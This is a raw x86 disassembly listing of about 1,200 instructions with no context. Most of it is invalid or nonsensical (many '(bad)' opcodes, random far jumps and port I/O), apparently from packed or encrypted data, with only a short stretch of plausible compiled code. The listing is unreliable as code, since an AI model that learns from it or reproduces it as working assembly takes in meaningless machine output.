  404279:	cmp    al,0x6f
  40427b:	rol    BYTE PTR [edx],cl
  40427d:	sub    eax,0x3f2687a5
  404282:	add    eax,0x39fded54
  404287:	loop   0x40426e
  404289:	sub    al,0x94
  40428b:	pop    ss
  40428c:	mov    bh,0x2d
  40428e:	in     al,0x3d
  404290:	div    dh
  404292:	pusha  
  404293:	sar    BYTE PTR [esi-0x1ce01188],1
  404299:	lds    eax,FWORD PTR [ebp-0x66f9fc20]
  40429f:	xchg   esi,eax
  4042a0:	enter  0xcf4e,0xb6
  4042a4:	pop    edx
  4042a5:	lods   eax,DWORD PTR ds:[esi]
  4042a6:	adc    BYTE PTR [eax+0x0],cl
  4042a9:	into   
  4042aa:	cli    
  4042ab:	mov    ah,0x77
  4042ad:	pop    eax
  4042ae:	sub    al,0xff
  4042b0:	add    eax,0x8f47d158
  4042b5:	push   0x6
  4042b7:	sbb    al,0x3e
  4042b9:	cdq    
  4042ba:	sar    BYTE PTR [ecx+0x1d354ec],0x6b
  4042c1:	jno    0x40424e
  4042c3:	xor    BYTE PTR [ecx+eiz*1],cl
  4042c6:	cmp    DWORD PTR [esi+0x6b3c8c2e],ebp
  4042cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042cd:	xchg   edx,eax
  4042ce:	outs   dx,DWORD PTR ds:[esi]
  4042cf:	xchg   ecx,eax
  4042d0:	les    edi,FWORD PTR [edx-0x3961fbbe]
  4042d6:	push   ds
  4042d7:	inc    edx
  4042d8:	jl     0x404283
  4042da:	fsub   DWORD PTR [ecx+0x6dec762b]
  4042e0:	lock das 
  4042e2:	fiadd  WORD PTR [edx+0x1c4b1647]
  4042e8:	mov    bh,0xd3
  4042ea:	xchg   edx,eax
  4042eb:	stos   BYTE PTR es:[edi],al
  4042ec:	outs   dx,BYTE PTR ds:[esi]
  4042ed:	in     eax,dx
  4042ee:	rcr    DWORD PTR [ebx+eiz*2+0x73],cl
  4042f2:	stc    
  4042f3:	mov    ds:0xced5af31,al
  4042f8:	mov    al,0x6f
  4042fa:	lods   eax,DWORD PTR ds:[esi]
  4042fb:	ret    0x3091
  4042fe:	loope  0x40435a
  404300:	xor    BYTE PTR [ebx],0x10
  404303:	jb     0x40434a
  404305:	pushf  
  404306:	loopne 0x404315
  404308:	mov    ebp,0x764df532
  40430d:	scas   eax,DWORD PTR es:[edi]
  40430e:	sbb    eax,0x3cadeea8
  404313:	in     eax,dx
  404314:	imul   eax,DWORD PTR [eax+eiz*8-0x5f17ff1e],0x855c9194
  40431f:	mov    edi,0xecafb8f5
  404324:	or     al,0x5c
  404326:	lods   eax,DWORD PTR ds:[esi]
  404327:	adc    DWORD PTR ds:0xdbfd68ea,edi
  40432d:	sti    
  40432e:	and    al,0xc8
  404330:	int    0xe6
  404332:	imul   edi,DWORD PTR [edx+0x5c8692b8],0x42b93631
  40433c:	mov    ds:0x15c2c813,eax
  404341:	imul   ecx,DWORD PTR [eax-0x7d],0x50f0e8fc
  404348:	sahf   
  404349:	into   
  40434a:	test   al,0x5c
  40434c:	test   eax,0x5015a549
  404351:	icebp  
  404352:	je     0x4043b2
  404354:	xor    eax,0x415e845f
  404359:	bound  eax,QWORD PTR [edi-0x5479c373]
  40435f:	jns    0x4043cd
  404361:	lods   eax,DWORD PTR ds:[esi]
  404362:	lahf   
  404363:	and    eax,0x6d9eab72
  404368:	pop    esi
  404369:	fcom   QWORD PTR [ebx+0x3]
  40436c:	mov    esp,0x523f2ed4
  404371:	pusha  
  404372:	adc    eax,0x2a4ad444
  404377:	xchg   esi,eax
  404378:	and    al,ah
  40437a:	pop    es
  40437b:	dec    esi
  40437c:	mov    ebx,0xf07cf312
  404381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404383:	sub    BYTE PTR [ecx*4-0x70bd9d0f],bl
  40438a:	enter  0x537a,0x56
  40438e:	sbb    ebx,edx
  404390:	bound  ebp,QWORD PTR [edx+eax*8-0x5deba2bb]
  404397:	test   eax,0x153e8f45
  40439c:	imul   DWORD PTR [eax-0x7d]
  40439f:	mov    esi,0xb02397bf
  4043a4:	add    eax,0xdf18d06d
  4043a9:	inc    edi
  4043aa:	sub    al,0xbc
  4043ac:	cmp    eax,0x2aabe016
  4043b1:	xchg   esi,eax
  4043b2:	sub    ecx,DWORD PTR [edi]
  4043b4:	popa   
  4043b5:	sub    ebp,DWORD PTR ds:0x562bcf4
  4043bb:	aad    0x1d
  4043bd:	stc    
  4043be:	sbb    ecx,DWORD PTR [ebx]
  4043c0:	push   edi
  4043c1:	mov    ch,0x99
  4043c3:	mov    eax,ds:0x8d2da90e
  4043c8:	pop    eax
  4043c9:	fld    DWORD PTR [edx]
  4043cb:	adc    BYTE PTR ds:0xeeb92374,cl
  4043d1:	jbe    0x4043e4
  4043d3:	dec    edx
  4043d4:	call   0x18f1:0xc403fb99
  4043db:	call   0xbd7d:0xab46ac9a
  4043e2:	mov    ebp,0xe77ab5e2
  4043e7:	inc    ebx
  4043e8:	xor    BYTE PTR [edi],dl
  4043ea:	sbb    ah,BYTE PTR [ebx-0x55]
  4043ed:	sub    eax,DWORD PTR [eax]
  4043ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f0:	test   al,0x4f
  4043f2:	out    dx,al
  4043f3:	sahf   
  4043f4:	pop    eax
  4043f5:	or     esp,edx
  4043f7:	jl     0x404432
  4043f9:	fsub   QWORD PTR [ebx]
  4043fb:	or     ch,BYTE PTR [ebx]
  4043fd:	dec    ecx
  4043fe:	push   es
  4043ff:	inc    esp
  404400:	push   cs
  404401:	mov    edi,0x3ac80f10
  404406:	mov    ds:0x90497ce,ax
  40440c:	ror    BYTE PTR [eax],cl
  40440e:	icebp  
  40440f:	xor    bl,BYTE PTR ds:0xa3f5be73
  404415:	in     al,0x96
  404417:	pop    esi
  404418:	(bad)  [ebp+0x4ec7cd49]
  40441e:	pop    esi
  40441f:	jmp    0x404445
  404421:	in     al,dx
  404422:	push   es
  404423:	mov    eax,DWORD PTR [ebp+0x1c]
  404426:	xchg   DWORD PTR [esi-0x31],esi
  404429:	outs   dx,DWORD PTR ds:[esi]
  40442a:	test   BYTE PTR [edx],ch
  40442c:	je     0x4044aa
  40442e:	dec    edx
  40442f:	xchg   edx,eax
  404430:	lahf   
  404431:	xchg   esi,eax
  404432:	cld    
  404433:	mov    cl,0x59
  404435:	imul   esi,DWORD PTR [ebp-0x7d],0x22
  404439:	repnz mov DWORD PTR [edx+0x6ce83ebf],edi
  404440:	data16 cld 
  404442:	ss cld 
  404444:	jp     0x404422
  404446:	(bad)  
  404447:	mov    bh,0xb7
  404449:	jb     0x4043d2
  40444b:	hlt    
  40444c:	sub    BYTE PTR [edx-0x3f2ec480],al
  404452:	add    eax,0x519419c8
  404457:	in     eax,0x2c
  404459:	in     al,0x3f
  40445b:	mov    eax,0xbe9b868b
  404460:	jmp    0xf473:0x18845991
  404467:	dec    ecx
  404468:	sub    eax,0xc8950e8b
  40446d:	outs   dx,DWORD PTR ds:[esi]
  40446e:	xchg   ecx,eax
  40446f:	clc    
  404470:	pop    esp
  404471:	inc    esi
  404472:	mov    edx,0xfa209b45
  404477:	iret   
  404478:	push   edx
  404479:	xchg   esi,eax
  40447a:	popf   
  40447b:	or     al,0x33
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40446b
  404490:	mov    WORD PTR [ecx-0x1e],es
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x40442a
  40449c:	mov    edi,0x8e50f1d9
  4044a1:	sbb    WORD PTR [edi+0x10],0x9190
  4044a7:	pop    ebx
  4044a8:	fldenv [edi+0x5c]
  4044ab:	push   es
  4044ac:	mov    al,0x38
  4044ae:	cmp    ecx,edx
  4044b0:	adc    eax,0x1f0e8fcd
  4044b5:	mov    al,0x29
  4044b7:	pop    esp
  4044b8:	fld    DWORD PTR [ebx]
  4044ba:	or     al,0xf4
  4044bc:	jl     0x4044e1
  4044be:	sbb    bh,ah
  4044c0:	retf   0x4aca
  4044c3:	cli    
  4044c4:	jne    0x404467
  4044c6:	ins    BYTE PTR es:[edi],dx
  4044c7:	push   es
  4044c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c9:	fcom   QWORD PTR [edx+ebx*2-0x788aba92]
  4044d0:	bound  eax,QWORD PTR [ebp-0x5a]
  4044d3:	inc    ebp
  4044d4:	mov    edi,0x3dde774d
  4044d9:	sti    
  4044da:	dec    esi
  4044db:	popa   
  4044dc:	aad    0xf4
  4044de:	push   esi
  4044df:	pop    eax
  4044e0:	std    
  4044e1:	mov    al,0xcc
  4044e3:	sub    edi,DWORD PTR [eax+0x5c]
  4044e6:	in     al,dx
  4044e7:	in     al,dx
  4044e8:	mov    ds:0xde37d86a,al
  4044ed:	outs   dx,DWORD PTR ds:[esi]
  4044ee:	add    DWORD PTR [ecx],0xffffffa8
  4044f1:	(bad)  
  4044f2:	sti    
  4044f3:	or     al,0xec
  4044f5:	popf   
  4044f6:	xchg   bx,ax
  4044f8:	push   esp
  4044f9:	inc    ecx
  4044fa:	xlat   BYTE PTR ds:[ebx]
  4044fb:	or     dl,ch
  4044fd:	pop    ds
  4044fe:	scas   eax,DWORD PTR es:[edi]
  4044ff:	sbb    ebx,DWORD PTR [edi]
  404501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404502:	(bad)  
  404503:	icebp  
  404504:	adc    eax,0xe6263e9b
  404509:	push   ebp
  40450a:	popf   
  40450b:	stos   BYTE PTR es:[edi],al
  40450c:	jns    0x404559
  40450e:	imul   ebx,DWORD PTR [edx+0x3e8f1184],0xffffff8f
  404515:	fwait
  404516:	idiv   DWORD PTR [ecx-0x3681146a]
  40451c:	jns    0x4044dd
  40451e:	rcl    DWORD PTR es:[edi+0x38],cl
  404522:	mov    ecx,0x928789fc
  404527:	sbb    eax,ecx
  404529:	cmp    eax,0xcccf80f5
  40452e:	xchg   esi,ebx
  404530:	je     0x40452c
  404532:	mov    ?,WORD PTR [ecx]
  404534:	es enter 0xbc66,0xeb
  404539:	jmp    FWORD PTR [edi]
  40453b:	mov    edx,0x9af92f79
  404540:	bound  ebx,QWORD PTR [ecx+0x72]
  404543:	dec    ebx
  404544:	andps  xmm3,XMMWORD PTR [esi]
  404547:	shr    BYTE PTR [ecx-0x339ad231],cl
  40454d:	aaa    
  40454e:	aaa    
  40454f:	stos   DWORD PTR es:[edi],eax
  404550:	sbb    edx,DWORD PTR [ecx+0x6f]
  404553:	dec    ecx
  404554:	out    0xe9,eax
  404556:	loope  0x40457b
  404558:	rcr    BYTE PTR [ebx+0x84de73b],cl
  40455e:	je     0x404506
  404560:	pop    ss
  404561:	fsub   QWORD PTR [ebx+0x1a]
  404564:	mov    ebp,0x51a10ad9
  404569:	inc    edi
  40456a:	cs mov eax,0x8c1d36da
  404570:	int    0x44
  404572:	mov    eax,0x368e4c3d
  404577:	out    0x25,al
  404579:	mov    edx,0xc93f40bc
  40457e:	xchg   ebp,eax
  40457f:	jmp    0xa3ab:0x3fbc03ee
  404586:	xchg   ecx,eax
  404587:	jmp    0x44ca4d17
  40458c:	xchg   edx,eax
  40458d:	stos   BYTE PTR es:[edi],al
  40458e:	push   0x6f4ad7cc
  404593:	mov    bl,BYTE PTR [edi+ebp*8+0x65456db6]
  40459a:	test   al,0x6
  40459c:	cld    
  40459d:	sbb    eax,0xe3a7c3e5
  4045a2:	outs   dx,BYTE PTR ds:[esi]
  4045a3:	(bad)  
  4045a4:	cmp    BYTE PTR [edi+0x4e6637bb],0xc4
  4045ab:	add    ebx,DWORD PTR [esp+ebp*2]
  4045ae:	and    eax,0x295bc047
  4045b3:	mov    ?,ecx
  4045b5:	ret    
  4045b6:	mov    edi,0x8f48239b
  4045bb:	je     0x4045a2
  4045bd:	xchg   edi,eax
  4045be:	jmp    0x4045b4
  4045c0:	aas    
  4045c1:	test   eax,0x88736e0f
  4045c6:	mov    cl,0x6c
  4045c8:	call   FWORD PTR [ebp+0x7089e1d2]
  4045ce:	sbb    BYTE PTR [edx],dh
  4045d0:	cmp    esi,esp
  4045d2:	in     eax,0x64
  4045d4:	sbb    BYTE PTR [eax+0x55],bl
  4045d7:	es scas eax,DWORD PTR es:[edi]
  4045d9:	jge    0x4045bb
  4045db:	dec    eax
  4045dc:	pushf  
  4045dd:	(bad)  
  4045de:	(bad)  
  4045df:	xchg   esp,eax
  4045e0:	lahf   
  4045e1:	xchg   esp,eax
  4045e2:	ds pop es
  4045e4:	ret    0x898c
  4045e7:	(bad)  
  4045e8:	cmp    bl,al
  4045ea:	add    BYTE PTR [ebx+0x2b84cdf6],bh
  4045f0:	dec    edi
  4045f2:	pop    es
  4045f3:	push   0x11acdc44
  4045f8:	test   DWORD PTR [ecx+0x46],esi
  4045fb:	dec    esi
  4045fc:	pop    ecx
  4045fd:	xchg   ecx,eax
  4045fe:	mov    al,BYTE PTR [esi]
  404600:	push   es
  404601:	imul   bl
  404603:	loope  0x404675
  404605:	mov    ds:0x13dd1a51,eax
  40460a:	add    al,0x63
  40460c:	test   BYTE PTR [ecx-0xb221b1c],0xb5
  404613:	data16 add al,0x1d
  404616:	cwde   
  404617:	les    eax,FWORD PTR [ebx+eiz*8+0x3a158948]
  40461e:	mov    DWORD PTR [esi+esi*2],esi
  404621:	fcmovnbe st,st(0)
  404623:	cmp    eax,0x5f7e37d6
  404628:	mov    DWORD PTR [ecx+0x58b96a7e],edx
  40462e:	dec    ebp
  40462f:	mov    ebp,0x39d3603b
  404634:	and    BYTE PTR [ecx-0x54],bh
  404637:	test   BYTE PTR [eax],bl
  404639:	cmc    
  40463a:	pop    es
  40463b:	iret   
  40463c:	aam    0xfd
  40463e:	rcl    BYTE PTR [edi-0x7a],1
  404641:	xor    BYTE PTR [ebp+0x53],cl
  404644:	cli    
  404645:	popf   
  404646:	dec    esp
  404647:	jecxz  0x4046a5
  404649:	add    ebx,DWORD PTR [ecx-0x1213c168]
  40464f:	and    al,0x76
  404651:	push   ebp
  404652:	out    0x15,al
  404654:	pop    ecx
  404655:	stc    
  404656:	mov    esp,ss
  404658:	pop    ebx
  404659:	fldcw  WORD PTR [ebp+0x6005c05f]
  40465f:	mov    ebp,DWORD PTR [ebp-0x1211bcc0]
  404665:	push   eax
  404666:	into   
  404667:	test   DWORD PTR [edx+edx*4+0x4f],edx
  40466b:	sub    bl,BYTE PTR [esi+0x2195940d]
  404671:	stc    
  404672:	cmc    
  404673:	push   edi
  404674:	shrd   ecx,edi,cl
  404677:	xor    al,ah
  404679:	adc    cl,BYTE PTR [eax-0x7e]
  40467c:	xchg   edx,eax
  40467d:	xchg   ecx,eax
  40467e:	cmp    BYTE PTR [ebp-0x3f9f1008],ah
  404684:	retf   0x2935
  404687:	cmp    BYTE PTR [esp+edx*8-0x4],cl
  40468b:	mov    ebx,0xa0f8db0a
  404690:	test   BYTE PTR [ecx-0x6c3985c7],bl
  404696:	fld    st(1)
  404698:	sbb    al,0x50
  40469a:	and    ebp,DWORD PTR [edx+0x59]
  40469d:	and    ch,ah
  40469f:	push   cs
  4046a0:	nop
  4046a1:	lds    edi,FWORD PTR [edi-0x5dfb2403]
  4046a7:	cmp    esp,ebp
  4046a9:	call   0x5c870a99
  4046ae:	push   ss
  4046af:	int    0x83
  4046b1:	(bad)  
  4046b3:	push   ebx
  4046b4:	jmp    0xfe28c0b6
  4046b9:	pop    ecx
  4046ba:	mov    ch,BYTE PTR [edx+edi*1]
  4046bd:	bound  ebx,QWORD PTR [esi-0x24]
  4046c0:	sub    ebx,DWORD PTR ds:0x1834487d
  4046c6:	test   dh,0x25
  4046c9:	fistp  WORD PTR [ebx+ebx*1]
  4046cc:	lods   al,BYTE PTR ds:[esi]
  4046cd:	and    DWORD PTR [esp+esi*4+0x2404f8e9],0x7a952058
  4046d8:	(bad)  
  4046d9:	adc    eax,0x72cf5f85
  4046de:	mov    bh,0x6f
  4046e0:	dec    edx
  4046e1:	sbb    DWORD PTR [ebx+0x684496ff],esi
  4046e7:	xchg   ecx,eax
  4046e8:	retf   0x52d0
  4046eb:	arpl   WORD PTR [ecx-0x6],cx
  4046ee:	xchg   DWORD PTR [edi+edi*4+0x6f49358e],esp
  4046f5:	dec    edx
  4046f6:	mov    eax,ds:0x947cef50
  4046fb:	lods   eax,DWORD PTR ds:[esi]
  4046fc:	jb     0x4046f6
  4046fe:	lock (bad) 
  404700:	and    BYTE PTR [esi+0x5a5ad331],bh
  404706:	or     esi,DWORD PTR ds:0x35456c82
  40470c:	add    edx,ecx
  40470e:	stos   BYTE PTR es:[edi],al
  40470f:	ror    cl,0xec
  404712:	stos   DWORD PTR es:[edi],eax
  404713:	aam    0xef
  404715:	loope  0x40474a
  404717:	pushf  
  404718:	repnz lods eax,DWORD PTR ds:[esi]
  40471a:	xchg   esi,eax
  40471b:	aas    
  40471c:	aaa    
  40471d:	sub    al,0x99
  40471f:	stos   BYTE PTR es:[edi],al
  404720:	and    al,0x52
  404722:	adc    edx,0xffffffd0
  404725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404726:	jne    0x404709
  404728:	jmp    0x404772
  40472a:	mov    eax,0x4c3969f2
  40472f:	jns    0x404705
  404731:	sahf   
  404732:	jo     0x4046d0
  404734:	pop    ebx
  404735:	ja     0x404757
  404737:	ss (bad) 
  404739:	ins    DWORD PTR es:[edi],dx
  40473a:	cmp    DWORD PTR [eax+esi*2+0x69],edx
  40473e:	xchg   edx,eax
  40473f:	jl     0x404736
  404741:	pop    edi
  404742:	inc    ebp
  404743:	int3   
  404744:	mov    esi,0x474a0ea0
  404749:	xchg   edx,eax
  40474a:	sbb    esp,DWORD PTR [eax-0x792ee0dc]
  404750:	retf   
  404751:	pushf  
  404752:	mov    dl,0x97
  404754:	or     BYTE PTR [esi+edi*2+0x30],bh
  404758:	sar    DWORD PTR [esp+edi*4],cl
  40475b:	xlat   BYTE PTR gs:[ebx]
  40475d:	stos   BYTE PTR es:[edi],al
  40475e:	cmp    ebx,DWORD PTR [ebp-0x6b0603dc]
  404764:	pop    es
  404765:	js     0x40478b
  404767:	rol    dh,cl
  404769:	int3   
  40476a:	clc    
  40476b:	push   eax
  40476c:	pop    ecx
  40476d:	xor    al,0xd6
  40476f:	mov    ebx,0xb8ab8960
  404774:	arpl   WORD PTR [ebp+0x25],bx
  404777:	retf   0xaa6a
  40477a:	out    0x78,eax
  40477c:	mov    bh,0x39
  40477e:	pop    ds
  40477f:	jecxz  0x40474a
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	lahf   
  4047b5:	ins    BYTE PTR es:[edi],dx
  4047b6:	jb     0x404799
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047d0
  4047c1:	cmp    eax,0xc57f508f
  4047c6:	(bad)  
  4047c7:	ror    bl,1
  4047c9:	rdmsr  
  4047cb:	pusha  
  4047cc:	ins    BYTE PTR es:[edi],dx
  4047cd:	(bad)  
  4047ce:	cmp    cl,bh
  4047d0:	test   al,0xe2
  4047d2:	(bad)  
  4047d3:	arpl   WORD PTR [esi+0x3a28cb2c],di
  4047d9:	clc    
  4047da:	xor    BYTE PTR [ebp+0x5a],bl
  4047dd:	mov    ch,0xe4
  4047df:	(bad)  
  4047e0:	jg     0x40480d
  4047e2:	adc    ebp,DWORD PTR [ebp+0x70]
  4047e5:	adc    DWORD PTR [esp+ebx*8],edx
  4047e8:	jp     0x4047d4
  4047ea:	dec    esp
  4047eb:	or     eax,0x3a6fab41
  4047f0:	xchg   ecx,eax
  4047f1:	shl    BYTE PTR [edx+eiz*1],1
  4047f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f5:	cld    
  4047f6:	icebp  
  4047f7:	inc    ecx
  4047f8:	iret   
  4047f9:	cmp    ebp,esi
  4047fb:	push   ebx
  4047fc:	es xchg ebp,eax
  4047fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ff:	add    DWORD PTR [edi],esi
  404801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404802:	leave  
  404803:	mov    DWORD PTR [edx+edi*8+0x7a],ebx
  404807:	test   BYTE PTR [eax+0x55557712],cl
  40480d:	sub    DWORD PTR [ebp-0x2ab78aa0],0x27
  404814:	and    eax,0x30334257
  404819:	xor    al,0x8e
  40481b:	jns    0x4047e2
  40481d:	nop    DWORD PTR [edx-0x301c9de3]
  404824:	inc    edx
  404825:	icebp  
  404826:	jo     0x40482a
  404828:	pop    ecx
  404829:	lahf   
  40482a:	sbb    cl,ch
  40482c:	push   esi
  40482d:	xlat   BYTE PTR ds:[ebx]
  40482e:	in     eax,dx
  40482f:	add    al,0x62
  404831:	loope  0x404812
  404833:	cmp    BYTE PTR [ebx+eiz*1],bl
  404836:	sbb    DWORD PTR [edx],esp
  404838:	scas   eax,DWORD PTR es:[edi]
  404839:	adc    bl,0xb
  40483c:	lahf   
  40483d:	imul   ecx,DWORD PTR [ebx+0x73],0xffffffb7
  404841:	ins    DWORD PTR es:[edi],dx
  404842:	cmp    bh,BYTE PTR ds:0x2487f538
  404848:	mov    ds:0x38710e85,eax
  40484d:	test   DWORD PTR [eax-0x80],ecx
  404850:	xchg   edi,eax
  404851:	jmp    FWORD PTR [ecx-0x26ce0b0]
  404857:	leave  
  404858:	into   
  404859:	fst    QWORD PTR [eax]
  40485b:	out    0x5e,eax
  40485d:	cmp    al,0xd2
  40485f:	push   eax
  404860:	ror    BYTE PTR [esp+edi*4],cl
  404863:	sub    al,BYTE PTR [ecx+0x26]
  404866:	call   0xa608baae
  40486b:	fisub  WORD PTR [edi-0xf]
  40486e:	add    cl,BYTE PTR [ecx+0x7e08786d]
  404874:	mov    ebp,ecx
  404876:	aas    
  404877:	in     al,0xfb
  404879:	sar    ebp,1
  40487b:	in     al,dx
  40487c:	into   
  40487d:	stos   BYTE PTR es:[edi],al
  40487e:	mov    DWORD PTR [edx-0x54a791cb],esp
  404884:	repz and al,0xf4
  404888:	jne    0x4048b7
  40488a:	adc    eax,0xd9583e3e
  40488f:	out    dx,al
  404890:	inc    esp
  404891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404892:	mov    DWORD PTR [edx-0x77b86e8b],0xac8cfb77
  40489c:	out    0x9f,al
  40489e:	sar    DWORD PTR [ebx-0x6d],0x25
  4048a2:	rcr    DWORD PTR [eax-0x48],1
  4048a5:	(bad)  
  4048a6:	jne    0x4048f1
  4048a8:	cmp    eax,0x9af861f8
  4048ad:	sub    DWORD PTR [eax+0x77eb804e],eax
  4048b3:	mov    eax,ds:0xca5f3a3
  4048b8:	pusha  
  4048b9:	js     0x4048a4
  4048bb:	test   DWORD PTR [eax],ebp
  4048bd:	ds cwde 
  4048bf:	xor    ebp,DWORD PTR [ebp+0x595c1b60]
  4048c5:	shr    DWORD PTR [edx+0x6d89d2db],1
  4048cb:	pop    ebx
  4048cc:	(bad)  
  4048cd:	leave  
  4048ce:	pop    ecx
  4048cf:	push   ds
  4048d0:	sbb    ah,BYTE PTR [ecx-0x11]
  4048d3:	sub    eax,0x6e292d84
  4048d8:	push   ss
  4048d9:	xchg   edx,eax
  4048da:	aas    
  4048db:	sahf   
  4048dc:	(bad)
  4048e0:	pop    ebp
  4048e1:	mov    dl,0x99
  4048e3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e5:	fcmovbe st,st(2)
  4048e7:	xor    ebx,eax
  4048e9:	lock cmc 
  4048eb:	das    
  4048ec:	jo     0x404951
  4048ee:	pop    ebx
  4048ef:	cmp    al,0xd6
  4048f1:	inc    ecx
  4048f2:	in     eax,0xda
  4048f4:	(bad)  
  4048f5:	sub    dh,BYTE PTR [ebx-0xc]
  4048f8:	enter  0xc360,0x2a
  4048fc:	in     eax,0xbe
  4048fe:	and    BYTE PTR [esi],0x1e
  404901:	lea    edi,[edx+0x27]
  404904:	cmp    al,0x33
  404906:	pop    edx
  404907:	jg     0x404918
  404909:	or     DWORD PTR [esi],0x539d7088
  40490f:	jmp    0x40497d
  404911:	and    bl,ch
  404913:	iret   
  404914:	lock dec edi
  404916:	or     dl,ah
  404918:	into   
  404919:	mov    WORD PTR es:[edx],cs
  40491c:	jl     0x40490f
  40491e:	lock sub eax,0x222f6fc0
  404924:	or     DWORD PTR [ebx],0xeff733
  40492a:	and    edx,DWORD PTR [ebp-0x8366d6e]
  404930:	mov    bl,0xcb
  404932:	dec    ebp
  404933:	out    dx,al
  404934:	add    DWORD PTR [ebx+0x73e6dd6],edx
  40493a:	jl     0x404902
  40493c:	cwde   
  40493d:	xor    al,BYTE PTR [edi]
  40493f:	xor    eax,0x3ff5c79f
  404944:	dec    ebx
  404945:	inc    edi
  404946:	sbb    cl,BYTE PTR [edi+0x58]
  404949:	mov    dl,0x66
  40494b:	shl    DWORD PTR [ebp+0x1e],1
  40494e:	inc    eax
  40494f:	push   ds
  404950:	pop    ebx
  404951:	inc    edi
  404952:	pop    ebx
  404953:	icebp  
  404954:	mov    cl,0xf9
  404956:	dec    esp
  404957:	iret   
  404958:	add    eax,0xcd03c2ff
  40495d:	pop    ebp
  40495e:	sbb    eax,0xc54045b
  404963:	out    0xe5,eax
  404965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404966:	inc    edx
  404967:	rep lods al,BYTE PTR ds:[esi]
  404969:	test   BYTE PTR [edi-0x10],ch
  40496c:	cld    
  40496d:	mov    ch,0x76
  40496f:	sub    DWORD PTR [edi],0xffffffa9
  404972:	es cmp dh,ch
  404975:	popa   
  404976:	jo     0x404917
  404978:	arpl   WORD PTR [edi-0x5],sp
  40497b:	hlt    
  40497c:	push   ebp
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	js     0x404918
  404980:	or     eax,0xf6dc982b
  404985:	bound  ebp,QWORD PTR [ecx]
  404987:	cmp    dh,BYTE PTR [ebp+0x773a2153]
  40498d:	xor    eax,0x65263d4c
  404992:	push   edx
  404993:	sub    al,0x38
  404996:	dec    ecx
  404997:	mov    dl,0xce
  404999:	clc    
  40499a:	shl    DWORD PTR [ebp+0x7a],1
  40499d:	mov    ebp,0x28ffd491
  4049a2:	fsub   DWORD PTR [ecx+eiz*4+0x18089149]
  4049a9:	in     al,0xeb
  4049ab:	xchg   esp,eax
  4049ac:	push   ebx
  4049ad:	int3   
  4049ae:	dec    eax
  4049af:	push   es
  4049b0:	ss mov ebp,0xefb3f5e3
  4049b6:	call   DWORD PTR [ebp+ebp*4-0x56]
  4049ba:	mov    WORD PTR [ecx+0x8],cs
  4049bd:	dec    eax
  4049be:	retf   0x8d99
  4049c1:	addr16 jae 0x404984
  4049c4:	push   0xd
  4049c6:	rcl    DWORD PTR [ebx-0x197b076f],cl
  4049cc:	fucomp st(6)
  4049ce:	fisttp WORD PTR [edx+0x48]
  4049d1:	fdiv   QWORD PTR [eax]
  4049d3:	jo     0x404990
  4049d5:	cs mov cl,0x75
  4049d8:	dec    ebx
  4049d9:	mov    al,0x5
  4049db:	and    ecx,DWORD PTR [eax]
  4049dd:	xchg   ebp,eax
  4049de:	shl    bl,cl
  4049e0:	(bad)  
  4049e1:	mov    eax,0x898cedca
  4049e6:	pop    edi
  4049e7:	outs   dx,DWORD PTR ds:[esi]
  4049e8:	pushf  
  4049e9:	(bad)  
  4049ea:	mov    ds:0x8d3bcc7e,eax
  4049f0:	sar    edx,0x0
  4049f3:	rcr    DWORD PTR [edx-0x358fb26],0xd2
  4049fa:	push   esp
  4049fb:	std    
  4049fc:	iret   
  4049fd:	jg     0x404a42
  4049ff:	dec    eax
  404a00:	adc    BYTE PTR [esi+0x4],bl
  404a03:	xor    bl,bl
  404a05:	inc    esp
  404a06:	stos   BYTE PTR es:[edi],al
  404a07:	xchg   esi,eax
  404a08:	and    esi,edx
  404a0a:	mov    ebx,0xdd0b3ff5
  404a0f:	xlat   BYTE PTR ds:[ebx]
  404a10:	push   esi
  404a11:	push   ds
  404a12:	(bad)  
  404a13:	fistp  QWORD PTR [esi+0x2f]
  404a16:	push   ebp
  404a17:	sub    esp,edx
  404a19:	mov    ebx,0x41762635
  404a1e:	cld    
  404a1f:	xor    al,0xa7
  404a21:	mov    eax,ds:0x24c1a6e2
  404a26:	cld    
  404a27:	pop    ecx
  404a28:	dec    ebx
  404a29:	pop    esp
  404a2a:	adc    BYTE PTR [ebx],dl
  404a2c:	push   ebp
  404a2d:	xor    eax,DWORD PTR [ecx+0x650e8495]
  404a33:	(bad)  
  404a34:	cmp    eax,0x1992a9b0
  404a39:	out    0x9f,eax
  404a3b:	dec    ebp
  404a3c:	cmc    
  404a3d:	jb     0x404a6c
  404a3f:	daa    
  404a40:	jecxz  0x4049cc
  404a42:	or     bl,BYTE PTR [edi]
  404a44:	call   0x4ee65e35
